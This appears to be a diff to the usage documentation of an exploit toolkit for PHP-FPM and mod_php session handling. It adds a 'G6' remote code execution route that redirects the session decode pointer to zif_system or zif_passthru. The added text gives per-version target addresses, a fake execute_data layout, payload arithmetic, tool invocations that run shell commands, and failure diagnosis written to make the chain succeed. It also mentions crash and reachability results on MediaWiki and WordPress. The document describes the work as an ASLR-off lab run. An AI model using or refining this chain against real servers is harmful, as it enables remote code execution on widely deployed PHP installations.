@@ -1,6 +1,6 @@
 # USAGE
 
-Install, layout and run one-liners: see `README.md`. This file is the lane matrix, the G2 plan, prerequisites, version matrix and failure diagnosis.
+Install, layout and run one-liners: see `README.md`. This file is the lane matrix, the G2/G6 plan, prerequisites, version matrix and failure diagnosis.
 
 ## Lane matrix
 
@@ -11,6 +11,7 @@ Install, layout and run one-liners: see `README.md`. This file is the lane matri
 | modphp pDestructor superglobal teardown | libphp.so PHP 8.5.10 NTS, httpd prefork | plant, then pre-RINIT upload progress decode | none (automatic shutdown path) | `$_POST` write lands at `heap+0x2060`, but fast shutdown destroys no auto global table | **closed**: `fast_shutdown=1` skips `zend_hash_graceful_reverse_destroy(EG(symbol_table))`; POST rc stays 1 |
 | fpm app fatal | php-fpm 8.5.10 static pool | post startup app level fatal inside the unserialize family | none | worker exits 70, no access row | measured, not a route by itself |
 | fpm G2 decode hijack | php-fpm 8.5.10, 8.4.25, 8.1.34, 7.4.33 ET_EXEC, ASLR off | `E_USER_ERROR` bailout inside `unserialize` | multipart session record plus forced END decode | marker created, worker survives, decode pointer overwritten | 8.5.10 confirmed lab; other profiles derived, offline `--step g2` |
+| fpm G6 zif decode | php-fpm 8.5.10, 8.4.25, 8.1.34, 7.4.33 ET_EXEC, ASLR off | same G2 plant | the G2 write points `ps_serializers[2].decode` at `zif_system` / `zif_passthru`; the record is a fake `zend_execute_data` | `zif_system`: marker created, then SIGSEGV at `php_exec+450`; `zif_passthru`: HTTP 200, marker recreated, worker survives | 8.5.10 live lab G6; other profiles binary-derived; offline `--step g2 --g2-decode ...` |
 | modphp in band leak | libphp.so PHP 8.5.10 NTS PIE | M5 plant and trigger | `sidlen` / `sidhex` overread | live session array pointer over HTTP, 4 of 4 runs | measured, `leak_offset` build specific; boot2 HTTP candidate (`K_dest` at `sidhex[8:16]`, `B0 = K_dest - 0x1000`) lab-only |
 | static session file leak | libphp.so PHP 8.5.10 NTS PIE, mod_php | failed `ini_set` save_path restore, 54 B GET reclaim | M11 encode overread, static GET of `sess_tb1` | 77,842 B seed served with matching sha1; overread crashed in `tmp_var` | **attempted-negative (F14)**: save_path control and static serving proven; no pointer or `B0`; controls partial; real target untested |
 | real apps | MediaWiki/Wikibase, WordPress/WooCommerce | anonymous app request | app specific | Wikibase fatal and worker survival, WP 1 of 4 consumers SIGSEGV | reachability and availability, no RCE |
@@ -65,10 +66,10 @@ candidate is the mod_php boot2 HTTP leak (`K_dest` at `sidhex[8:16]`,
 | `producer` | no, unless `--live` | request bytes and `result.json` |
 | `write_stage` | never | final forged multipart bytes |
 | `leak` | never | dry modphp calibration plan |
-| `g2` | never | `g2-record.bin`, profile, md5 and plan JSON |
+| `g2` | never | `g2-record.bin`, profile, md5, decode mode and plan JSON |
 | `chain` | modphp sequence dry by default; fpm legacy path is live | per-candidate receipt |
 
-## G2 plan
+## G2 / G6 plan
 
 G2 is the confirmed FPM route on the plain PHP 8.5.10 build, with derived profiles
 for 8.4.25, 8.1.34 and 7.4.33. A controlled bailout leaves a stale
@@ -77,19 +78,27 @@ it, and the typed zval write reaches `ps_serializers[2].decode` in `.data`. The
 forced END decode then calls the overwritten pointer with the session record bytes
 as `rdi`.
 
+G6 uses the same write but points `ps_serializers[2].decode` at
+`zif_system` or `zif_passthru`. The record doubles as a fake
+`zend_execute_data`; `zif_system` executes the command but is one-shot because
+its `return_value` write crashes, while `zif_passthru` is the clean surviving
+control.
+
 Inputs, all explicit:
 
 | flag | meaning | default |
 |---|---|---|
 | `--g2-profile` | profile version, binary md5 or `.json` path | 8.5.10 |
-| `--g2-x` | session record buffer `zend_string` X | required |
-| `--g2-p` | stale `php_unserialize_data` P | required |
-| `--g2-b0` | stale `var_dtor_entries` B0 | required |
+| `--g2-x` | first decode buffer `zend_string` X1 (planted T1) | required |
+| `--g2-x2` | second decode buffer `zend_string` X2 (re-encoded T2); the fake execute_data is read from it | required for zif modes |
+| `--g2-decode` | `php_binary` (G2), `zif_passthru` (G6 clean) or `zif_system` (G6 one-shot) | `php_binary` |
+| `--g2-p` | stale `php_unserialize_data` P, relative to X1 | required |
+| `--g2-b0` | stale `var_dtor_entries` B0, relative to X1 | required |
 | `--g2-total` | session record length | profile lab geometry, 131014 |
-| `--g2-target` | 16 byte aligned write target | `ps_serializers[2].decode` from the selected profile |
-| `--g2-value` | serialized long written at the target | `i:1;` |
-| `--libc-base` | libc base; `system = base + 0x53090` | none |
-| `--command` | shell command, padded to 32 bytes, must end `#` | `id;exit;#` |
+| `--g2-target` | 16 byte aligned write slot; zif modes keep this slot and write the profile zif address as `i:<n>;` | `ps_serializers[2].decode` from the selected profile |
+| `--g2-value` | serialized long written at the target (php_binary only) | `i:1;` |
+| `--libc-base` | libc base, `system = base + 0x53090` (php_binary only) | none |
+| `--command` | php_binary: shell command padded to 32 bytes, must end `#`; zif: NUL-free command, no padding | php_binary `id;exit;#`, zif `id` |
 
 Profiles are md5 locked. `PROFILE_MD5` in `tool/modules/g2_chain.py` maps each md5
 to one JSON; a version label is only a convenience key. A binary whose md5 is not
@@ -159,14 +168,30 @@ Expected record: 131014 bytes, sha256
 `used_slots -8796082913867`, `p_off 94184`, `b_off 106472`, `payload_start 63`,
 `L 130949`, `system 0x7ffff7cef090`.
 
+G6 clean control, same geometry plus the second decode buffer:
+
+```sh
+python3 -m tool --step g2 --g2-decode zif_passthru \
+  --g2-x 0x7ffff7a6a000 --g2-x2 0x7ffff7aae000 \
+  --g2-p 0x7ffff7a81000 --g2-b0 0x7ffff7a84000 \
+  --command 'touch /tmp/FPM_ZIF' --output files/io/g6-passthru
+```
+
+Swap `--g2-decode zif_system` for the one-shot proof. `--g2-target` remains
+`0x14c1b60`; the record writes `i:8976055;` (passthru) or `i:8976039;`
+(system). `--g2-x2` is mandatory, and `--g2-value`/`--libc-base` are rejected.
+
 `--g2-profile` selects offsets only. X, P, B0, the libc base and the record
 length remain target specific; do not reuse the 8.5.10 receipt geometry on
 another build.
 
 Self-checks run before the record is written: 32 byte key, serialized long,
 target 16 byte alignment, negative `used_slots`, second slot below B0, fake P
-and fake B0 inside the payload, record length convergence. A failed check or a
-missing address exits 2 with the reason in `result.json`.
+and fake B0 inside the payload, record length convergence. The zif modes also
+check the 96-byte key1, the exact negative-K arithmetic, the fake execute_data
+ranges (`F`, `F+0x10`, `F+0x18`), a non-empty NUL-free command, and that fake P/B0
+do not overlap the fake execute_data. A failed check or a missing address exits
+2 with the reason in `result.json`.
 
 G2 preconditions and limits:
 
@@ -177,6 +202,7 @@ G2 preconditions and limits:
 | serializer | `php_binary` decode is 16 byte aligned; the default `php` handler uses the `PS(serializer)` slot plus a fake 24 byte struct |
 | libc | base for `system`, or a fixed target that accepts `(char *, size_t)`; the fixed target route is not demonstrated |
 | heap | X, P, B0 and the exact record length |
+| G6 zif decode | X1 and X2 plus P and B0; profile `zif_system`/`zif_passthru`; `zif_passthru` is the clean control, `zif_system` is one-shot |
 | FPM setup | upload progress on with the forced END update in the same request |
 | ordering | the plant request must be the immediately preceding request on the same worker |
 | retries | single shot per plant; the corrupt decode pointer persists until worker restart |
@@ -190,6 +216,78 @@ claim is made for other session savers, opcache, ZTS or shared pools. 5.x cannot
 reuse this geometry: `php_unserialize_data` has a different field order,
 `used_slots` is at `+0x2000`, `next` at `+0x2008`, the bound is equality, and
 `BG(unserialize)` is a struct.
+
+## G6 zif decode (lab RCE)
+
+G6 is the positive extension of the G2 serializer write: on 8.5.10 the write
+points `ps_serializers[2].decode` at `zif_system` (`0x88f6a7`) or
+`zif_passthru` (`0x88f6b7`). Decode #1 is the G2 write on the planted
+131,014-byte buffer (`T1`); the request re-encodes the same record to 131,313
+bytes (`T2`); decode #2 calls the overwritten pointer with
+`rdi = ZSTR_VAL(data) = 0x7ffff7aae018` and `rsi = ZSTR_LEN(data) = 0x200f1`
+(131,313). The lab gdb trace for `zif_system` recorded
+`ser2decode=0x88f6a7`, `php_exec_ex` with
+`rdx=0x1 numargs=1 arg1val=0x7ffff7aae18f arg1type=6`,
+`php_exec type=1 cmd=... array=(nil) retval=0x200f1`, and the command created
+`FPM_ZIF`. The worker then took SIGSEGV at `php_exec+450` (`mov %rax,(%rcx)`,
+`rcx=0x200f1`).
+
+Minimal fake `execute_data` parse (S is the raw session buffer,
+`ZSTR_VAL(data)`):
+
+| location | value | requirement |
+|---|---|---|
+| `S+0x2c` | `1` (u32) | `num_args == 1` |
+| `S+0x50` | `F` | argument 1 zval value pointer |
+| `S+0x58` | `6` | zval type `IS_STRING` |
+| `F+0x10` | `strlen(F+0x18)` | fake `zend_string` length |
+| `F+0x18` | command | non-empty, NUL-terminated, no embedded NUL |
+| `S+0x18` / `S+0x20` | unread | `func` / `arg_info` are not required |
+
+The command does not need the php_binary 32-byte padding or trailing `#`. The
+96-byte binary key supplies the call fields and is written back verbatim by the
+re-encoder. With the 8.5.10 receipt geometry (`X1=0x7ffff7a6a000`,
+`X2=0x7ffff7aae000`, `P=0x7ffff7a81000`, `B0=0x7ffff7a84000`, total 131014):
+
+```
+rec1_len      = 107
+Q             = payload_start = 0x77
+L             = 130893
+F             = X2 + 0x18 + Q + 0x100 = 0x7ffff7aae18f
+command       = X2 + 0x18 + Q + 0x118 = 0x7ffff7aae1a7
+used_slots K  = (0x14c1b60 - (B0 + 0x10)) / 16 = -8796082913867
+```
+
+The record is `[0x60][96-byte key][i:<zif decimal address>;]` plus
+`\x01zs:<L>:"<payload>";`; the fake P and B0 sit in the payload relative to X1,
+and `F` is relative to X2. Hashes for the reference command
+`touch /tmp/opencode/research/g6zif_20261021T222434Z/FPM_ZIF`:
+`zif_system` `3ba454f85777e57230330fd483401dbfd384570b635d0818b0a93e4454f7354f`,
+`zif_passthru` `a3622221a56ef25cb1e652a590b0fd22f52a2c919bd9aeff28957b448b81a84f`.
+
+Clean control: the identical chain with `zif_passthru` recorded
+`ser2decode=0x88f6b7`, `php_exec_ex rdx=0x3`, `php_exec type=3`, returned
+HTTP 200 (`PID=1249787`), recreated the marker and kept the worker alive.
+`type=3` never writes `return_value`. `zif_system` is therefore one-shot: with
+`type=1`, `php_exec()` always writes a return zval through
+`return_value=ZSTR_LEN(data)`; here that is the integer `0x200f1`, so the write
+at `php_exec+450` is unconditionally non-canonical. There is no parameterless
+way to avoid it for `zif_system`. `zif_passthru` is the preferred clean target.
+
+| version | target slot | `zif_system` | `zif_passthru` | `php_exec_ex` | `php_exec` | state |
+|---|---|---|---|---|---|---|
+| 8.5.10 | `0x14c1b60` | `0x88f6a7` | `0x88f6b7` | `0x88f435` | `0x88f21f` | live G6, ASLR off |
+| 8.4.25 | `0xe01180` | `0x753d20` | `0x753d30` | `0x753aa3` | `0x75388d` | binary-derived |
+| 8.1.34 | `0xe01140` | `0x7348f9` | `0x734909` | `0x73467d` | `0x734467` | binary-derived |
+| 7.4.33 | `0xe010a0` | `0x71dd66` | `0x71dd76` | `0x71daf7` | `0x71d7fc` | binary-derived |
+
+`zif_passthru = zif_system + 0x10` on all four binaries, verified with `nm -an`
+and `readelf -sW`. Only 8.5.10 is a live G6 run; the other symbols are
+binary-derived profile data. G6 still needs X1, X2, P and B0, and no
+ASLR-capable heap leak is demonstrated. Real-target status: **F12b pending**,
+**F14 attempted-negative**, boot2 HTTP leak **lab-only**. The G6 proof is a
+private ASLR-off lab run, not a real-target claim. Receipt:
+`/tmp/opencode/research/g6zif_20261021T222434Z/README.md`.
 
 ## modphp machinery lane
 
@@ -255,6 +353,11 @@ with `used_slots` at `+0x2000` and `next` at `+0x2008`, the bound is equality, a
 | MediaWiki 1.46.2 + Wikibase REL1_46 | anonymous `action=parse`, `contentmodel=wikibase-item`, `contentformat=application/vnd.php.serialized` | 52,065 B blob exhausts 1 GiB inside `php_var_unserialize_internal` at depth 1,533; HTTP 500; the FPM child survives and serves the next request on the same PID; `BG(unserialize).level=1` and the dtor chain survive into the next request |
 | WordPress 7.1.3 + WooCommerce 11.2.1 | guest classic checkout, 12 address fields, 84 MiB synthetic pressure, WCS sink replica | producer OOM inside `unserialize`; the next multipart consumer writes into the stale dtor block; 1 of 4 consumers died with SIGSEGV (502), 3 of 4 returned 200; the sink is a labeled replica because paid WCS 9.0.0 was not on disk; no RCE claimed |
 
+No real target has been tested for G6. The real-target evaluation is **F12b
+pending**; F14 remains **attempted-negative** (no ASLR-capable heap leak and no
+`B0`); the boot2 HTTP leak candidate is **lab-only**. The G6 parser and command
+execution are proven only on the private 8.5.10 ASLR-off lab.
+
 ## Fingerprint and profile pack
 
 | item | behavior | numbers |
@@ -267,7 +370,7 @@ with `used_slots` at `+0x2000` and `next` at `+0x2008`, the bound is equality, a
 | address profile | `addresses/apache_libphp.json`, per binary offsets and lane | 40492240 B, md5 `92f76e84a77bf8b56c45c3868fa29a6c`, p_align 0x1000 |
 | five resolved symbols | `zif_system` 0x40cc80, `zif_passthru` 0x40cc90, `zend_call_function` 0x540500, `zend_llist_remove_tail` 0x5d39a0, `zval_ptr_dtor` 0x5f0980 | deltas 0xb0480 and 0x1c6d10 |
 | engine symbols | `php_url_encode` 0x460d70, `ps_globals` 0xa3b020, `basic_globals` 0xa3bdc0, `php_apache_sapi_ub_write` 0x5f7ee0, `zend_rc_dtor_func` 0x96f760 | PS(id) offset 16, PS(http_session_vars) offset 360 |
-| G2 profiles | `addresses/g2_fpm_8510.json`, `g2_fpm_8425.json`, `g2_fpm_8134.json`, `g2_fpm_7433.json` | 8.5.10 table 0x14c1b20, decode 0x14c1b60; 8.4.25 0xe01180; 8.1.34 0xe01140; 7.4.33 0xe010a0; all md5 locked, libc system 0x53090 |
+| G2/G6 profiles | `addresses/g2_fpm_8510.json`, `g2_fpm_8425.json`, `g2_fpm_8134.json`, `g2_fpm_7433.json` | 8.5.10 table 0x14c1b20, decode 0x14c1b60; 8.4.25 0xe01180; 8.1.34 0xe01140; 7.4.33 0xe010a0; zif_system/passthru recorded for all four, passthru = system + 0x10; all md5 locked, libc system 0x53090 |
 | profile pack build | `universal/profile_builder.py` reads `nm` and `readelf` and writes `addresses/*.json` | new target needs `profiles.py` TARGETS plus BINARY_PROFILES |
 
 ## Failure diagnosis
@@ -280,11 +383,16 @@ with `used_slots` at `+0x2000` and `next` at `+0x2008`, the bound is equality, a
 | modphp assumptions fail on FPM | SAPI mismatch; machinery OOM kills the FPM worker with exit 70 | phpinfo Server API | use the fpm app level producer plus the small arm |
 | arm returns `0` with no OOM | modphp `memory_limit` knob absent or 128M build default | phpinfo `memory_limit` | set the knob, the producer refuses pre flight |
 | same sid requests time out | session file flock queue | session save path lock holders | use a fresh sid except in the deliberate stale stage |
-| g2 exits 2, missing address | X, P or B0 not supplied | `result.json` error lists the missing flag | pass all three; the plan never guesses |
+| g2 exits 2, missing address | X, P or B0 not supplied; zif modes also need X2 | `result.json` error lists the missing flag | pass all required addresses; the plan never guesses |
 | g2 exits 2, unknown profile | version label, md5 or path not in the registry | `result.json` error lists valid labels | use a profile version, md5, or `.json` path |
 | g2 exits 2, no transport | `--live` passed to an offline step | `result.json` says no transport | drop `--live` |
 | g2 default php handler | php decode slot is not 16 byte aligned; a target at `table + 0x28` fails | `result.json` target and `ps_serializer_slot` | target `PS(serializer)` and write a fake struct pointer |
-| g2 command error | command does not end `#` or is longer than 32 bytes | `result.json` error | trim and end with `#` |
+| g2 command error | php_binary command does not end `#` or is longer than 32 bytes | `result.json` error | trim and end with `#` |
+| g2 zif missing X2 | zif_system/zif_passthru read the fake execute_data from the re-encoded second decode buffer | `result.json` error names `--g2-x2` | supply X2, not X1 |
+| g2 zif command error | zif command is empty, contains NUL, or runs past the payload | `result.json` error / checks | use a non-empty NUL-free command and verify `cmd_off` bounds |
+| g2 zif target error | `--g2-value`/`--libc-base` used with a zif mode, or target not aligned | `result.json` error | let the zif mode write the profile address; use an aligned slot |
+| g2 zif_system worker crash | expected one-shot behavior: `php_exec type=1` writes `return_value=ZSTR_LEN(data)` | crash at `php_exec+450`, marker exists | use `zif_passthru` when worker survival matters |
+| g2 zif_passthru failure | fake call type or command pointer wrong; type=3 does not crash on return_value | gdb `ser2decode`, `arg1type=6`, `F+0x10/F+0x18` | rebuild the record from the selected profile |
 | g2 target error | target not 16 byte aligned, or not reachable from B0 | `result.json` error | use an aligned target below B0 + 0x10 |
 | g2 P or B0 outside payload | wrong X or total | check `p_off`, `b_off`, `payload_start` in `result.json` | re-measure X or the record length |
 | g2 record checks fail | second slot above B0 or length does not converge | `result.json` checks | re-check the direction and total |
